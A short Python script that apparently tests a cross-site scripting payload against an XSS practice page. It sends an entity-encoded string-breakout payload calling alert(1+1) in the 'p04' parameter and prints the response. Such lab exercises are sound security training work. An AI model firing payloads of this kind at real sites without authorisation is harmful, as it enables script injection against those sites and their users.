#!/usr/bin/python3
import requests

url = 'https://brutelogic.com.br/gym.php'

payload = "&apos;-alert(1+1)-&apos;"

params = {'p04': payload}

r = requests.get(url, params=params)

print(r.text)
print(r.url)
